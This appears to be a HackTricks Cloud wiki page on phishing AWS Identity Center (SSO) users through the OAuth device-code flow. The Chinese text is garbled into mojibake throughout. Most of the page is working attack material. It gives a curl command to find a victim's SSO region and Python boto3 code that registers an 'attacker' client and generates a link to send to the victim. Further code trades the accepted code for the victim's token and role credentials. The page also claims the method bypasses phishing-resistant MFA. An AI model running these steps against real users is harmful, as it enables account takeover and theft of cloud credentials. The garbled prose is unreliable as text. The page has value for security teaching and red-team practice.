# AWS - Identity Center & SSO Unauthenticated Enum

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP Hackingï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}

## AWS Device Code Phishing

æœ€åˆåœ¨ [**è¿™ç¯‡åšå®¢æ–‡ç« **](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/) ä¸­æå‡ºï¼Œå¯ä»¥å‘ä½¿ç”¨ AWS SSO çš„ç”¨æˆ·å‘é€ä¸€ä¸ª**é“¾æ¥**ï¼Œå¦‚æœ**ç”¨æˆ·æ¥å—**ï¼Œæ”»å‡»è€…å°†èƒ½å¤Ÿè·å¾—ä¸€ä¸ª**ä»¤ç‰Œæ¥å†’å……ç”¨æˆ·**å¹¶è®¿é—®ç”¨æˆ·åœ¨**Identity Center**ä¸­èƒ½å¤Ÿè®¿é—®çš„æ‰€æœ‰è§’è‰²ã€‚

ä¸ºäº†æ‰§è¡Œæ­¤æ”»å‡»ï¼Œè¦æ±‚å¦‚ä¸‹ï¼š

* å—å®³è€…éœ€è¦ä½¿ç”¨ **Identity Center**
* æ”»å‡»è€…å¿…é¡»çŸ¥é“å—å®³è€…ä½¿ç”¨çš„**å­åŸŸå** `<victimsub>.awsapps.com/start`

ä»…å‡­ä¸Šè¿°ä¿¡æ¯ï¼Œ**æ”»å‡»è€…å°†èƒ½å¤Ÿå‘ç”¨æˆ·å‘é€ä¸€ä¸ªé“¾æ¥**ï¼Œå¦‚æœ**æ¥å—**ï¼Œå°†æˆäºˆ**æ”»å‡»è€…å¯¹ AWS ç”¨æˆ·**è´¦æˆ·çš„è®¿é—®æƒé™ã€‚

### æ”»å‡»

1. **æŸ¥æ‰¾å­åŸŸå**

æ”»å‡»è€…çš„ç¬¬ä¸€æ­¥æ˜¯æ‰¾å‡ºå—å®³å…¬å¸åœ¨å…¶ Identity Center ä¸­ä½¿ç”¨çš„å­åŸŸåã€‚è¿™å¯ä»¥é€šè¿‡ **OSINT** æˆ– **çŒœæµ‹ + BF** å®Œæˆï¼Œå› ä¸ºå¤§å¤šæ•°å…¬å¸ä¼šåœ¨æ­¤å¤„ä½¿ç”¨å…¶åç§°æˆ–å…¶åç§°çš„å˜ä½“ã€‚

æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œå°±å¯ä»¥è·å– Identity Center é…ç½®çš„åŒºåŸŸï¼š
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **ç”Ÿæˆé“¾æ¥å¹¶å‘é€ç»™å—å®³è€…**

è¿è¡Œä»¥ä¸‹ä»£ç ç”Ÿæˆä¸€ä¸ªAWS SSOç™»å½•é“¾æ¥ï¼Œä»¥ä¾¿å—å®³è€…è¿›è¡Œèº«ä»½éªŒè¯ã€‚\
åœ¨æ¼”ç¤ºä¸­ï¼Œåœ¨pythonæ§åˆ¶å°ä¸­è¿è¡Œæ­¤ä»£ç ï¼Œå¹¶ä¸”ä¸è¦é€€å‡ºï¼Œå› ä¸ºç¨åæ‚¨å°†éœ€è¦ä¸€äº›å¯¹è±¡æ¥è·å–ä»¤ç‰Œï¼š
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
Send the generated link to the victim using you awesome social engineering skills!

3. **ç­‰å¾…å—å®³è€…æ¥å—é‚€è¯·**

å¦‚æœå—å®³è€…**å·²ç»ç™»å½•äº†AWS**ï¼Œä»–åªéœ€è¦æ¥å—æˆæƒæƒé™ï¼Œå¦‚æœæ²¡æœ‰ç™»å½•ï¼Œä»–éœ€è¦**å…ˆç™»å½•ç„¶åæ¥å—æˆæƒæƒé™**ã€‚\
è¿™æ˜¯å½“å‰çš„æç¤ºç•Œé¢ï¼š

<figure><img src="../../../.gitbook/assets/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **è·å–SSOè®¿é—®ä»¤ç‰Œ**

å¦‚æœå—å®³è€…æ¥å—äº†æç¤ºï¼Œè¿è¡Œä»¥ä¸‹ä»£ç **ç”Ÿæˆä¸€ä¸ªå†’å……ç”¨æˆ·çš„SSOä»¤ç‰Œ**ï¼š
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
SSO è®¿é—®ä»¤ç‰Œ **æœ‰æ•ˆæœŸä¸º 8å°æ—¶**ã€‚

5. **å†’å……ç”¨æˆ·**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### é’“é±¼ä¸å¯é’“çš„ MFA

æœ‰è¶£çš„æ˜¯ï¼Œä¹‹å‰çš„æ”»å‡»**å³ä½¿ä½¿ç”¨â€œä¸å¯é’“çš„ MFAâ€ï¼ˆwebAuthï¼‰ä¹Ÿèƒ½å¥æ•ˆ**ã€‚è¿™æ˜¯å› ä¸ºä¹‹å‰çš„**å·¥ä½œæµç¨‹ä»æœªç¦»å¼€ä½¿ç”¨çš„ OAuth åŸŸ**ã€‚ä¸åƒå…¶ä»–é’“é±¼æ”»å‡»éœ€è¦ç”¨æˆ·æ›¿æ¢ç™»å½•åŸŸï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè®¾å¤‡ä»£ç å·¥ä½œæµç¨‹æ˜¯å‡†å¤‡å¥½çš„ï¼Œå› æ­¤**è®¾å¤‡çŸ¥é“ä¸€ä¸ªä»£ç **ï¼Œç”¨æˆ·å³ä½¿åœ¨ä¸åŒçš„æœºå™¨ä¸Šä¹Ÿèƒ½ç™»å½•ã€‚å¦‚æœæ¥å—æç¤ºï¼Œè®¾å¤‡åªéœ€**çŸ¥é“åˆå§‹ä»£ç **ï¼Œå°±èƒ½å¤Ÿ**æ£€ç´¢ç”¨æˆ·çš„å‡­è¯**ã€‚

æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹[**è¿™ç¯‡æ–‡ç« **](https://mjg59.dreamwidth.org/62175.html)ã€‚

### è‡ªåŠ¨åŒ–å·¥å…·

* [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
* [https://github.com/sebastian-mora/awsssome\_phish](https://github.com/sebastian-mora/awsssome_phish)

## å‚è€ƒèµ„æ–™

* [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
* [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
* [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
* [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hackingï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP Hackingï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Šå…³æ³¨æˆ‘ä»¬ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}
